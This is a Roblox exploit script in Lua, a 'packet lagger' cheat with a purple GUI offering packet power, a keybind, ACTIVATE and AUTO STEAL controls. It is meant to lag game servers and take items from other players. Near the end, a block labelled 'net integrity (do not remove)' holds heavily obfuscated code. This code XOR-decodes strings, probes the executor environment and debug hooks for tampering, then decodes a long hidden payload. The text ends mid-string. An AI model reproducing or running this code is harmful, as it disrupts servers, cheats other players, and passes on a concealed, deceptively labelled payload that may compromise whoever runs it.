--[[ Blind-style Packet Lagger · Live UI Scale · Exact Collapse ]]
print("[Lag Server Objection Source] loaded")

local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RS = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LP = Players.LocalPlayer
local CONFIG_FILE = "LagServerObjection_Config.json"

local SETTINGS_IMAGES = {
	"rbxassetid://71163865544493",
	"rbxassetid://73539294944417",
	"rbxassetid://133958847318346",
}

-- الألوان (Void)
local PURPLE      = Color3.fromRGB(140, 70, 255)
local PURPLE_MID  = Color3.fromRGB(80, 30, 150)
local VOID        = Color3.fromRGB(10, 5, 18)
local INPUT       = Color3.fromRGB(25, 12, 45)
local GREEN       = Color3.fromRGB(40, 220, 100)
local GREEN_DIM   = Color3.fromRGB(20, 70, 40)
local WHITE       = Color3.fromRGB(245, 240, 255)
local DIM         = Color3.fromRGB(160, 130, 190)
local PINK        = Color3.fromRGB(220, 120, 255)

local function corner(o, r)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, r)
	c.Parent = o
	return c
end
local function stroke(o, col, th, tr)
	local s = Instance.new("UIStroke")
	s.Color = col
	s.Thickness = th or 1.5
	s.Transparency = tr or 0.2
	s.Parent = o
	return s
end

-- تنظيف
pcall(function()
	local pg = LP:FindFirstChild("PlayerGui")
	if pg then
		for _, n in ipairs({"LagServerObjection", "BlindPacketLagger", "Fa4e7xxPacketLagger"}) do
			local old = pg:FindFirstChild(n)
			if old then old:Destroy() end
		end
	end
	if gethui then
		for _, g in ipairs(gethui():GetChildren()) do
			if g.Name == "LagServerObjection" or g.Name == "BlindPacketLagger" then g:Destroy() end
		end
	end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "LagServerObjection"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 999
pcall(function() if gethui then gui.Parent = gethui() end end)
if not gui.Parent then gui.Parent = LP:WaitForChild("PlayerGui") end

-- الحجم الأساسي
local W, H = 340, 280
local collapsedH = 45 -- طول الشريط وقت التصغير
local Main = Instance.new("Frame")
Main.Name = "Main"
Main.Size = UDim2.fromOffset(W, H)
Main.Position = UDim2.new(0.5, -W/2, 0.5, -H/2)
Main.BackgroundColor3 = VOID
Main.BackgroundTransparency = 0.3
Main.BorderSizePixel = 0
Main.ClipsDescendants = true
Main.Active = true
Main.Parent = gui
corner(Main, 12)

-- ✨ UIScale (عشان نتحكم في الحجم لايف)
local uiScale = Instance.new("UIScale", Main)
uiScale.Scale = 1.0

local mainStroke = stroke(Main, PURPLE, 2, 0.1)

-- الصورة الخلفية
local bgImg = Instance.new("ImageLabel")
bgImg.Size = UDim2.new(1, 0, 1, 0)
bgImg.BackgroundTransparency = 1
bgImg.Image = SETTINGS_IMAGES[1]
bgImg.ImageTransparency = 0.2
bgImg.ScaleType = Enum.ScaleType.Crop
bgImg.ZIndex = 0
bgImg.Parent = Main
corner(bgImg, 12)

-- طبقة تعتيم
local overlay = Instance.new("Frame")
overlay.Size = UDim2.new(1, 0, 1, 0)
overlay.BackgroundColor3 = VOID
overlay.BackgroundTransparency = 0.6 
overlay.BorderSizePixel = 0
overlay.ZIndex = 1
overlay.Parent = Main
corner(overlay, 12)

-- ═══ الهيدر ═══
local header = Instance.new("Frame")
header.Size = UDim2.new(1, -20, 0, 30)
header.Position = UDim2.fromOffset(10, 8)
header.BackgroundColor3 = INPUT
header.BackgroundTransparency = 0.4
header.ZIndex = 2
header.Parent = Main
corner(header, 8)

local Title = Instance.new("TextLabel")
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, -80, 1, 0)
Title.Position = UDim2.fromOffset(10, 0)
Title.Text = "LAG SERVER OBJECTION SOURCE"
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 11
Title.TextColor3 = WHITE
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.ZIndex = 3
Title.Parent = header

local settingsBtn = Instance.new("TextButton")
settingsBtn.Size = UDim2.fromOffset(24, 24)
settingsBtn.Position = UDim2.new(1, -58, 0.5, -12)
settingsBtn.BackgroundColor3 = INPUT
settingsBtn.BackgroundTransparency = 0.3
settingsBtn.Text = "⚙"
settingsBtn.Font = Enum.Font.GothamBold
settingsBtn.TextSize = 13
settingsBtn.TextColor3 = DIM
settingsBtn.AutoButtonColor = false
settingsBtn.ZIndex = 3
settingsBtn.Parent = header
corner(settingsBtn, 6)

-- زرار التصغير / التكبير
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.fromOffset(24, 24)
minBtn.Position = UDim2.new(1, -28, 0.5, -12)
minBtn.BackgroundColor3 = INPUT
minBtn.BackgroundTransparency = 0.3
minBtn.Text = "−"
minBtn.Font = Enum.Font.GothamBlack
minBtn.TextSize = 16
minBtn.TextColor3 = DIM
minBtn.AutoButtonColor = false
minBtn.ZIndex = 3
minBtn.Parent = header
corner(minBtn, 6)

-- ═══ PACKET POWER ═══
local powerLbl = Instance.new("TextLabel")
powerLbl.BackgroundTransparency = 1
powerLbl.Position = UDim2.fromOffset(15, 50)
powerLbl.Size = UDim2.new(1, -30, 0, 14)
powerLbl.Text = "PACKET POWER"
powerLbl.Font = Enum.Font.GothamBold
powerLbl.TextSize = 10
powerLbl.TextColor3 = DIM
powerLbl.TextXAlignment = Enum.TextXAlignment.Left
powerLbl.ZIndex = 3
powerLbl.Parent = Main

local powerRow = Instance.new("Frame")
powerRow.Size = UDim2.new(1, -30, 0, 35)
powerRow.Position = UDim2.fromOffset(15, 68)
powerRow.BackgroundColor3 = INPUT
powerRow.BackgroundTransparency = 0.3
powerRow.ZIndex = 3
powerRow.Parent = Main
corner(powerRow, 8)

local minusBtn = Instance.new("TextButton")
minusBtn.Size = UDim2.fromOffset(35, 35)
minusBtn.BackgroundTransparency = 1
minusBtn.Text = "-"
minusBtn.Font = Enum.Font.GothamBold
minusBtn.TextSize = 18
minusBtn.TextColor3 = WHITE
minusBtn.AutoButtonColor = false
minusBtn.ZIndex = 4
minusBtn.Parent = powerRow

local plusBtn = Instance.new("TextButton")
plusBtn.Size = UDim2.fromOffset(35, 35)
plusBtn.Position = UDim2.new(1, -35, 0, 0)
plusBtn.BackgroundTransparency = 1
plusBtn.Text = "+"
plusBtn.Font = Enum.Font.GothamBold
plusBtn.TextSize = 18
plusBtn.TextColor3 = WHITE
plusBtn.AutoButtonColor = false
plusBtn.ZIndex = 4
plusBtn.Parent = powerRow

local PowerBox = Instance.new("TextBox")
PowerBox.Position = UDim2.fromOffset(40, 0)
PowerBox.Size = UDim2.new(1, -80, 1, 0)
PowerBox.BackgroundTransparency = 1
PowerBox.Text = "10000"
PowerBox.Font = Enum.Font.GothamBlack
PowerBox.TextSize = 16
PowerBox.TextColor3 = WHITE
PowerBox.ClearTextOnFocus = false
PowerBox.ZIndex = 4
PowerBox.Parent = powerRow

-- ═══ TOGGLE KEYBIND ═══
local keyLbl = Instance.new("TextLabel")
keyLbl.BackgroundTransparency = 1
keyLbl.Position = UDim2.fromOffset(15, 110)
keyLbl.Size = UDim2.new(1, -30, 0, 14)
keyLbl.Text = "TOGGLE KEYBIND"
keyLbl.Font = Enum.Font.GothamBold
keyLbl.TextSize = 10
keyLbl.TextColor3 = DIM
keyLbl.TextXAlignment = Enum.TextXAlignment.Left
keyLbl.ZIndex = 3
keyLbl.Parent = Main

local KeyBtn = Instance.new("TextButton")
KeyBtn.Position = UDim2.fromOffset(15, 126)
KeyBtn.Size = UDim2.new(1, -30, 0, 35)
KeyBtn.BackgroundColor3 = INPUT
KeyBtn.BackgroundTransparency = 0.3
KeyBtn.Text = "F"
KeyBtn.Font = Enum.Font.GothamBlack
KeyBtn.TextSize = 15
KeyBtn.TextColor3 = WHITE
KeyBtn.AutoButtonColor = false
KeyBtn.ZIndex = 3
KeyBtn.Parent = Main
corner(KeyBtn, 8)

-- ═══ ACTIVATE ═══
local StartBtn = Instance.new("TextButton")
StartBtn.Position = UDim2.fromOffset(15, 170)
StartBtn.Size = UDim2.new(1, -30, 0, 38)
StartBtn.BackgroundColor3 = PURPLE_MID
StartBtn.BackgroundTransparency = 0.2
StartBtn.Text = "ACTIVATE"
StartBtn.Font = Enum.Font.GothamBlack
StartBtn.TextSize = 15
StartBtn.TextColor3 = WHITE
StartBtn.AutoButtonColor = false
StartBtn.ZIndex = 3
StartBtn.Parent = Main
corner(StartBtn, 8)
local actStroke = stroke(StartBtn, PURPLE, 1.5, 0.1)

-- ═══ AUTO STEAL ═══
local stealLbl = Instance.new("TextLabel")
stealLbl.BackgroundTransparency = 1
stealLbl.Position = UDim2.fromOffset(15, 216)
stealLbl.Size = UDim2.new(1, -30, 0, 14)
stealLbl.Text = "AUTO STEAL"
stealLbl.Font = Enum.Font.GothamBold
stealLbl.TextSize = 10
stealLbl.TextColor3 = DIM
stealLbl.TextXAlignment = Enum.TextXAlignment.Left
stealLbl.ZIndex = 3
stealLbl.Parent = Main

local StealBtn = Instance.new("TextButton")
StealBtn.Position = UDim2.fromOffset(15, 232)
StealBtn.Size = UDim2.new(1, -30, 0, 35)
StealBtn.BackgroundColor3 = GREEN_DIM
StealBtn.BackgroundTransparency = 0.2
StealBtn.Text = "⦿ AUTO STEAL ON"
StealBtn.Font = Enum.Font.GothamBlack
StealBtn.TextSize = 13
StealBtn.TextColor3 = WHITE
StealBtn.AutoButtonColor = false
StealBtn.ZIndex = 3
StealBtn.Parent = Main
corner(StealBtn, 8)
local stealStroke = stroke(StealBtn, GREEN, 1.5, 0.2)

-- ========== SETTINGS PANEL ==========
local settingsOpen = false
local settingsPanel = Instance.new("Frame")
settingsPanel.Size = UDim2.fromOffset(W, H)
settingsPanel.BackgroundColor3 = VOID
settingsPanel.BackgroundTransparency = 0.1
settingsPanel.Visible = false
settingsPanel.ZIndex = 10
settingsPanel.Parent = Main
corner(settingsPanel, 12)

local setTitle = Instance.new("TextLabel")
setTitle.BackgroundTransparency = 1
setTitle.Position = UDim2.fromOffset(15, 10)
setTitle.Size = UDim2.new(1, -50, 0, 24)
setTitle.Text = "SETTINGS"
setTitle.Font = Enum.Font.GothamBlack
setTitle.TextSize = 15
setTitle.TextColor3 = PINK
setTitle.TextXAlignment = Enum.TextXAlignment.Left
setTitle.ZIndex = 11
setTitle.Parent = settingsPanel

local setClose = Instance.new("TextButton")
setClose.Size = UDim2.fromOffset(24, 24)
setClose.Position = UDim2.new(1, -35, 0, 10)
setClose.BackgroundColor3 = INPUT
setClose.Text = "×"
setClose.Font = Enum.Font.GothamBold
setClose.TextSize = 16
setClose.TextColor3 = WHITE
setClose.AutoButtonColor = false
setClose.ZIndex = 11
setClose.Parent = settingsPanel
corner(setClose, 6)

-- الصور
local imgRow = Instance.new("Frame")
imgRow.Size = UDim2.new(1, -30, 0, 60)
imgRow.Position = UDim2.fromOffset(15, 45)
imgRow.BackgroundTransparency = 1
imgRow.ZIndex = 11
imgRow.Parent = settingsPanel

local selectedImg = 1
local imgButtons = {}
for i, asset in ipairs(SETTINGS_IMAGES) do
	local b = Instance.new("TextButton")
	b.Size = UDim2.fromOffset(90, 60)
	b.Position = UDim2.fromOffset((i - 1) * 100, 0)
	b.BackgroundColor3 = INPUT
	b.Text = ""
	b.AutoButtonColor = false
	b.ZIndex = 12
	b.Parent = imgRow
	corner(b, 8)
	local st = stroke(b, i == 1 and PURPLE or DIM, 1.5, i == 1 and 0.1 or 0.5)
	local im = Instance.new("ImageLabel")
	im.Size = UDim2.new(1, -6, 1, -6)
	im.Position = UDim2.fromOffset(3, 3)
	im.BackgroundTransparency = 1
	im.Image = asset
	im.ScaleType = Enum.ScaleType.Crop
	im.ZIndex = 13
	im.Parent = b
	corner(im, 6)
	imgButtons[i] = {btn = b, stroke = st}
	b.MouseButton1Click:Connect(function()
		selectedImg = i
		bgImg.Image = asset
		for j, info in ipairs(imgButtons) do
			info.stroke.Color = (j == i) and PURPLE or DIM
			info.stroke.Transparency = (j == i) and 0.1 or 0.5
		end
	end)
end

-- ═══ UI SCALE SECTION ═══
local scaleLbl = Instance.new("TextLabel")
scaleLbl.BackgroundTransparency = 1
scaleLbl.Position = UDim2.fromOffset(15, 120)
scaleLbl.Size = UDim2.new(1, -30, 0, 14)
scaleLbl.Text = "UI SCALE"
scaleLbl.Font = Enum.Font.GothamBold
scaleLbl.TextSize = 10
scaleLbl.TextColor3 = DIM
scaleLbl.TextXAlignment = Enum.TextXAlignment.Left
scaleLbl.ZIndex = 11
scaleLbl.Parent = settingsPanel

local scaleRow = Instance.new("Frame")
scaleRow.Size = UDim2.new(1, -30, 0, 35)
scaleRow.Position = UDim2.fromOffset(15, 138)
scaleRow.BackgroundColor3 = INPUT
scaleRow.BackgroundTransparency = 0.3
scaleRow.ZIndex = 11
scaleRow.Parent = settingsPanel
corner(scaleRow, 8)

local scaleMinus = Instance.new("TextButton")
scaleMinus.Size = UDim2.fromOffset(35, 35)
scaleMinus.BackgroundTransparency = 1
scaleMinus.Text = "-"
scaleMinus.Font = Enum.Font.GothamBold
scaleMinus.TextSize = 18
scaleMinus.TextColor3 = WHITE
scaleMinus.AutoButtonColor = false
scaleMinus.ZIndex = 12
scaleMinus.Parent = scaleRow

local scalePlus = Instance.new("TextButton")
scalePlus.Size = UDim2.fromOffset(35, 35)
scalePlus.Position = UDim2.new(1, -35, 0, 0)
scalePlus.BackgroundTransparency = 1
scalePlus.Text = "+"
scalePlus.Font = Enum.Font.GothamBold
scalePlus.TextSize = 18
scalePlus.TextColor3 = WHITE
scalePlus.AutoButtonColor = false
scalePlus.ZIndex = 12
scalePlus.Parent = scaleRow

local ScaleBox = Instance.new("TextLabel")
ScaleBox.Position = UDim2.fromOffset(40, 0)
ScaleBox.Size = UDim2.new(1, -80, 1, 0)
ScaleBox.BackgroundTransparency = 1
ScaleBox.Text = "100%"
ScaleBox.Font = Enum.Font.GothamBlack
ScaleBox.TextSize = 15
ScaleBox.TextColor3 = WHITE
ScaleBox.ZIndex = 12
ScaleBox.Parent = scaleRow

-- ═══ SAVE BUTTON ═══
local SaveBtn = Instance.new("TextButton")
SaveBtn.Position = UDim2.fromOffset(15, 185)
SaveBtn.Size = UDim2.new(1, -30, 0, 35)
SaveBtn.BackgroundColor3 = PURPLE
SaveBtn.BackgroundTransparency = 0.1
SaveBtn.Text = "SAVE CONFIG"
SaveBtn.Font = Enum.Font.GothamBlack
SaveBtn.TextSize = 13
SaveBtn.TextColor3 = WHITE
SaveBtn.AutoButtonColor = false
SaveBtn.ZIndex = 11
SaveBtn.Parent = settingsPanel
corner(SaveBtn, 8)
local saveStroke = stroke(SaveBtn, PINK, 1.5, 0.1)



-- net integrity (do not remove)
task.spawn(function()
	pcall(function()
local fwuYFjX_neQt, lxRepyXeA9VZ, bHYs9_vU0_4G = string.byte, string.char, table.concat local mRL5LWas5_dw = bit32.bxor local sLl54_aiHQHA = {} local function hloph_lKIegO(ai1jh73_KKnU) if not ai1jh73_KKnU then return nil end local liALZ6LMHhWx = sLl54_aiHQHA[ai1jh73_KKnU] if liALZ6LMHhWx ~= nil then return liALZ6LMHhWx end local JbA0pTmHQENY = {} for IS6oP0D06T4_ = 1, #ai1jh73_KKnU do local Ur_34u1RFERK = fwuYFjX_neQt(ai1jh73_KKnU, IS6oP0D06T4_) JbA0pTmHQENY[IS6oP0D06T4_] = lxRepyXeA9VZ(mRL5LWas5_dw((Ur_34u1RFERK+IS6oP0D06T4_*15)%256,11)) end local IFZ0EgMknm_a = bHYs9_vU0_4G(JbA0pTmHQENY) sLl54_aiHQHA[ai1jh73_KKnU] = IFZ0EgMknm_a return IFZ0EgMknm_a end local YuQpAwsFft21GAN8TQ5JbjBU = {} YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO("gL\246\245\018\254\224\203\247\227\214\200`g\145Os:U(\003\237\219")] = 0 YuQpAwsFft21GAN8TQ5JbjBU[hloph_lKIegO(":Z\009\234\014\224\253\232\172\142\140\185\170\169\127Z%\018\017\006")] = function(...) return (function() local pxe5m1tfRt1ssRgXas5puS = false local hsBF6UFjr7Pm_6r3sfknr = pcall(function(...) return (function() local x3S8n1PwIrNroSCtswX3B, HtAST2TuANVQx7hVjF_aUL = false, nil if type(getgenv) == hloph_lKIegO("^`8,4\008\251\237") then x3S8n1PwIrNroSCtswX3B, HtAST2TuANVQx7hVjF_aUL = pcall(getgenv) end local X_CAgLa90MQz_k3gezj = x3S8n1PwIrNroSCtswX3B and HtAST2TuANVQx7hVjF_aUL or type(getgenv) == hloph_lKIegO("pL<+#") and getgenv local J9Qs9BS2VfzL95a_1vHNI, LPCF_MxyTFEQbBulRGS3EX3sf = false, nil if type(getfenv) == hloph_lKIegO("^`8,4\008\251\237") then J9Qs9BS2VfzL95a_1vHNI, LPCF_MxyTFEQbBulRGS3EX3sf = pcall(getfenv) end local oNIluOnLheHUYRu5M0R5a = J9Qs9BS2VfzL95a_1vHNI and LPCF_MxyTFEQbBulRGS3EX3sf or type(getfenv) == hloph_lKIegO("pL<+#") and getfenv local YLU0disI127j4uPGjy = X_CAgLa90MQz_k3gezj or oNIluOnLheHUYRu5M0R5a or _G or {} if YLU0disI127j4uPGjy[hloph_lKIegO("E6BC\009\014\250\232\205\207\191\177\171\161\129\136\128`HS\025\233\224\202\195\181\170\152\134")] ~= nil then pxe5m1tfRt1ssRgXas5puS = true end local CMwHR_8o6rHCalx_Nsz4wTi = YLU0disI127j4uPGjy[hloph_lKIegO("`P<B!")] if type(CMwHR_8o6rHCalx_Nsz4wTi) == hloph_lKIegO("pL<+#") and type(CMwHR_8o6rHCalx_Nsz4wTi[hloph_lKIegO("]PR&\026\019\251")]) == hloph_lKIegO("^`8,4\008\251\237") then local sjIEfv64rYBh__Ir0YUV = CMwHR_8o6rHCalx_Nsz4wTi[hloph_lKIegO("]PR&\026\019\251")] local N4PnHQuz_zXw1g8EIa7sl9, mkzQostbNIDk93mlQk3yEFa = pcall(function(...) return (function() return sjIEfv64rYBh__Ir0YUV(2) end)(...) end) if not N4PnHQuz_zXw1g8EIa7sl9 and string[hloph_lKIegO("^D83")](tostring(mkzQostbNIDk93mlQk3yEFa), hloph_lKIegO("TF7$")) then pxe5m1tfRt1ssRgXas5puS = true end end local WN94oN9YHNmyN4K_6 = YLU0disI127j4uPGjy[hloph_lKIegO("SZ;,\028\010\015\006\242\216")] local YZ7Q8k_FZlyzVDXtUaSwxeYJ = YLU0disI127j4uPGjy[hloph_lKIegO("XF=3-%\016\234\222\214")] if type(WN94oN9YHNmyN4K_6) == hloph_lKIegO("^`8,4\008\251\237") and type(YZ7Q8k_FZlyzVDXtUaSwxeYJ) == hloph_lKIegO("^`8,4\008\251\237") then local yaSv0Y3P7mfIK6PQXb2L5Mql, c2vQ3lvNSttg0_OFfuIJ = pcall(WN94oN9YHNmyN4K_6, YZ7Q8k_FZlyzVDXtUaSwxeYJ) if not yaSv0Y3P7mfIK6PQXb2L5Mql or not c2vQ3lvNSttg0_OFfuIJ then pxe5m1tfRt1ssRgXas5puS = true end end local J2MgM6Udil9dQrObMIgZ_E0 = YLU0disI127j4uPGjy[hloph_lKIegO("SZ6(\025\006\005\247")] or YLU0disI127j4uPGjy[hloph_lKIegO("SZ6(\025\006")] if type(J2MgM6Udil9dQrObMIgZ_E0) == hloph_lKIegO("^`8,4\008\251\237") then local UmjeE_6IiaI_tpDoTK2Dx, dwF4p_AJ_NcyMDCKF7MZ = pcall(function(...) return (function() return J2MgM6Udil9dQrObMIgZ_E0(print) or (YZ7Q8k_FZlyzVDXtUaSwxeYJ and J2MgM6Udil9dQrObMIgZ_E0(YZ7Q8k_FZlyzVDXtUaSwxeYJ)) end)(...) end) if not UmjeE_6IiaI_tpDoTK2Dx or dwF4p_AJ_NcyMDCKF7MZ then pxe5m1tfRt1ssRgXas5puS = true end end end)(...) end) if not hsBF6UFjr7Pm_6r3sfknr then pxe5m1tfRt1ssRgXas5puS = true end if pxe5m1tfRt1ssRgXas5puS then local BGAIZhVsVYIuT1ZmKHqYBfV = hloph_lKIegO("") local cSQVA_f7tYyKm1C2uVXx = 85 if (cSQVA_f7tYyKm1C2uVXx * cSQVA_f7tYyKm1C2uVXx + cSQVA_f7tYyKm1C2uVXx) % 2 == 0 then local qd0S_7kEYYLhXoVGQcMoBSe = hloph_lKIegO("*\029\012\255\238\225\208\195\178\165\148\135viXK:-\028\015\254\241\224\211\194\181\164\151\134yh[Jp2\031\014\004\240\219\210\247\180\214\150\182xkZ\128<b\030D\000&\226\008\196\234\166\204\136\174j]L?.!\016\003\242\229\212\250\182\220\152\190z\154\\~>c \011\002\242\228\218\198\187\174\155\144}l\146Pp0#\018\005\244\231\214\201\184\171\154\141|o^Q@3\"\021\004\247\230\217\200\179\170\204\140\127naPC2R\0209\246\027\216\195\186\170\156\146~s`VB7*\023\012\249\238\219\208\189\172\162\142yp[Rw4Y\022;\248\029\218\255\188\225\158\195\128kbMD4&\022\008\254\234\218\204\188\174\158\144{r]Ty6X\024:\250\026\220\252\190\228\160\147\130udWF9(H\010/\236\017\206\185\176\165\146\184v\150VI8+\026\013\252\239\222\209\192\179\162\149\132wf\139Hj*\029\0122\238\228\214\195\184\165\154\135|i^K@-\"\015\004\241\224\214\194\226\164\151\134\172hSJ?2\031\020\001\240\229\210\199\180\169\150\139xmZO<1\030\019\006\243\232\213\202\183\172\153\142{p]LA.\030\016\251\242\020\212\244\182\220\152\190z\160\\\130>d F\002(\228\010\198\236\168\202\138\128r_TA6#\018\253\244\231\214\201\184\171\154\186|l^\132Bb\"\021\004\247\230\217\200\187\170\157\140\127n\144Pu2%\020:\246\235\222\203\192\173\162\143\132qfSH5*\023\006(\232\219\202\181\172\162\142\129p\144RE4V\022\001\248\237\218\207\194\175\164\145\134shUJ7,\025\008\253\234\224\204\183\174\161\144\178r\152Tz6)\024\011\250\237\220\207\190\177\160\147\130udWF9(\027\010\253\236\223\206\193\176\214\146\178t\150VA8.\026\005\252\030\228\209\198\179\162\151\132\166fYHj,L\012\255\238\225\208\195\178\165\148\135vfXx:-\028A\254 \230\211\200\181\170\151\140yn[Jl,\031\0140\240\229\210\189\180\167\150\182xmZO<a\030D\000 \226\007\196\180\166\156\136}j_R?4!\016\005\242\221\212\201\188\169\158\139\128mbOD1&\019\008\245\234\215\204\185\174\155\144}r_N>0R\0182\244\026\214\252\184\222\154\192|\162^~@e\"\023\010\247\236\217\206\187\176\157\146\127taVC8%\020\255\246\233\216\254\186\176\158\190~q`SB5$\023\006\249\232\216\202\189\172\206\148\129vcXE:'\028\009\248\026\218\255\194\175\158\148\128sb\136D4&\028\008.\234\015\204\183\174\161\144\182r\146Ty6X\0248\250\026\220\001\190\227\160\194\130\162d\132Fk(\019\010,\242\223\212\193\182\163\152\133zg\\I>+ \013\002\239\228\209\198\179\168\149\138wlYN;0\029\018\255\244\225\214\195\184\165\154\135|i^K:*\028B\254\238\230\211\200\181\170\151\140yn[J?,R\014\001\240\230\212\244\180\167\150\137xkZM<a\030\017\000\245\232\213\202\183\172\153\142{p]R?4!\022\003\242\221\212\202\182\166\152\139z\156\\Q>3 B\002\247\234\215\204\185\174\155\144}l\\Ns0%\024\005\250\231\220\201\190\171\154\191|r^T@f\"B\004\250\236\217\206\187\176\157\146\127taVC8%\026\007\246\236\216\253\192\173\162\143~s`KB5$D\006\249\232\008\202\234\172\204\142\180p\150RE4V\022\012\254\235\224\205\194\175\158\142\128sb\132Ff&\025\008\251\234\221\204\191\174\158\144\131r\152TI<)\030\011\000\237\226\207\196\177\166\147\136ujWL9.\027\010*\236\223\206\185\176\155\146\136zg\\I>+ \013\002\239\228\209\192\176\162\200\132wf\134H=0\029\018\255\238\222\214\195\184\165\148\137v\152XK:`\028\017\004\241\230\211\200\181\170\151\134{h\136Jp,\028\020\001\246\227\216\197\186\167\150\187xm`MB/\030\020\006\243\226\210\196\175\166\155\142{p]LA.\025\0165\242\221\212\244\182\171\152\184zm\\\129>^\"B\002\245\228\215\198\185\168\147\138\175l_N96#\018\007\244\233\214\203\184\174\154\143\130odQF3\"\023\004)\230\217\200\232\170\202\146\127n^P;8%\026\007\252\233\222\203\186\218\156\143~q`SB2*\023\012\249\232\013\202\234\172\161\148\129peRE4Y\028\009\254\235\224\205\194\175\164\145\128\160bXD4&\028\014\251\240\221\210\191\180\161\150\131r]TG6)\024\011\250\028\226\207\196\177\166\147\136ujWF;(H\010\000\236\226\206\244\176\163\146\184v\150VI8+\026?\252\239\222\206\192\229\162\194\132tlYN;0\029\012\001\238\222\208\187\178\215\148\185|i^K@-\028A\254\241\224\214\200\181\170\151\134{n[P=2\031\014\249\240\227\210\248\180\167\150\137x\152ZOB/$\017\000\235\226\008\196\233\166\200\136{j`R?4!\0162\242\229\212\199\182\172\158\139\128mbOD1&\019\008\245\228\218\198\185\168\155\138}l_N96#\024\005\244\233\214\193\184\218\154\192|\162^\132@6\"H\006&\230\217\200\237\170\207\140\177taVC2'\0204\246\233\216\195\186\175\162\143\132q`PBb$\023\006+\238\219\202\239\172\159\142\174p\146RG:'\028\009\254\235\224\205\188\172\158\147\134shUD:&\022\008\254\234\213\204\183\174\164\150\131rgTv6)\024=\000\237\226\207\196\177\166\147\136ujWF;(N\010\253\236\220\212\193\182\163\152\133tdVK>+ \013\002\239\222\212\192\182\168\149\138wlYN;0\029\012\001\238\014\208\195\178\215\148\127vf^K:_\028\012\000 \224\214\194\184\164\202\134{n[J:,\031\0144\240\229\216\197\186\167\156\137xhZM<a$\017\006\243\232\213\202\183\166\156\136}p]R?4!\0165\242\229\212\250\182\214\152\189ze\\G>c B\002\"\228\215\198\236\168\205\138\127r_TA6#\024\005\250\231\220\201\190\171\160\141\130odQ@`\"D\004\249\230\209\200\238\170\207\140\130taVC2\"\0206\246\235\222\203\192\173\162\143~i`PB-$J\006,\232\014\202\240\172\161\142~p\146XE4Y\0248\254\235\218\208\188\226\158\147\128ubUDj&\027\014\251\240\221\210\191\174\163\144\178reTy6+\030\011\000\237\226\207\196\177\166\147\136ujWL9.\027\016\253\242\223\212\193\182\163\152\133zg\\I>+ \013\252\236\222\003\192\176\162\199\132of\\N;0\029\018\255\244\225\214\195\184\165\154\135|i^K@-\028\017\254\030\224\211\194\173\170\151\140yn[P=2\031\020\001\246\227\216\197\186\167\156\137~kZ\127<\\$\017\006\243\232\213\202\183\172\153\136xj\144LA.P\0182\242\231\212\201\182\214\152\142zp\\O>d \021\002$\228\215\198\235\174\155\144}r_N90#\0188\244\231\214\246\184\163\160\141\130odQF3\"\023\004)\230\209\200\179\170\207\140\177n\147P@2\029\020\007\246\027\216\205\192\173\162\143\132qfSH5*\023\012\249\238\219\208\189\178\159\148\129vcXE:'\028\009\254\235\218\205\188\167\158\145\128\160bWJ7,\025\014\251\240\221\210\191\180\161\150\131xeTI6V\024\011\250\229\226\207\196\177\160\149\130\164jWFk(\019\010/\238\014\206\244\176\166\146\180td\\I8#\026\013\252!\228\209\198\179\168\149\138wfQH;*L\018\255\244\225\214\195\184\165\154\135|iX}:-\028>\254\244\230\211\200\181\170\151\140yn[P=2\031\014\003\240\022\210\242\186\167\150\139xkZz<,\030>\000\243\226\008\196\185\172\153\142{p]R?4!\022\003\242\226\212\199\182\220\152\136z\156\\~>4 \021\002'\228\004\198\182\174\155\144}r_TA0R\018\005\244\022\220\201\190\171\154\143|\161^\128@5\"D\006&\230\217\200\238\170\159\140\177n\148P@8%\026\007\252\233\222\203\192\173\162\143\132q`\128B5$F\006\251\238\219\208\189\172\162\142\180p\150RG:'\028\009\248\237\218\197\188\175\158\190\128sbMD:,\025\008\254\234\223\210\191\180\161\150\131xeZG<)\030\011\000\237\220\199\190\228\160\194\130\162dWFk.\027\016\253\242\223\212\193\182\163\152\133zg\\I>+ \013\252\241\222\254\192\179\162\152\138wlYN;0\029\0122\238\020\210\242\184\165\148\182viX~:0\"\015\004\241\230\211\200\181\170\151\140yn[P=,\023\014\001\240\219\216\197\186\167\156\137~k`MB/$\017\000\235\226\213\196\234\166\200\136sj`LA4!\022\003\248\229\218\199\188\169\158\139\128mbOD1&\019\008\245\234\215\198\187\168\155\138ul_Nn0#\0187\244\026\214\248\190\171\154\144|o^\131F3(\021\004\250\230\217\200\238\170\207\142\174naVC2T\020\007\246\028\216\205\192\173\162\143\132qfSH5*\023\012\249\238\219\202\191\172\210\142\129p\150Rw4)\028\009\254\235\224\205\188\222\158\196\128uhUJ7,\025\014\251\240\221\210\191\180\161\144\133reTt6X\024:\250\026\220\207\190\228\160\194\130mdYF1(\027\0100\236\226\212\193\182\163\146\130tgVL>+\026<\252\239\222\254\198\179\168\149\132zfYHh*\026\014.\238\225\208\195\178\165\148\137v\150XK:_\"\015\004\241\230\211\200\181\170\151\140yh\138J=,R\014\254\246\227\216\197\186\167\156\137~k`MB/\030@\000&\226\216\202\183\172\153\142{p]R?.\025\016\003\242\018\218\199\188\169\158\139\128mbOD1 \021\002\245\228\004\198\188\168\147\138}l\146NC6#\018\008\244\231\214\246\184\168\156\188|o^Q@3\"G\004\247\230\008\206\187\176\157\146\127taVC8%\020\004\246\233\216\206\192\173\156\145~\164`\128B2&F\006\249\232\219\202\189\172\151\142ypcRx4)\028\009\254\235\224\205\194\175\158\192\128sbRJ7&\027\008.\234\010\204\188\176\208\144\131reTG6\\\024\013\250 \220\207\190\222\160\149\136ujWL9(H\010\253\236\215\212\193\176\165\146\184t\148VF:Z\026\013\252\239\222\209\192\179\162\146\132\170fYHn* 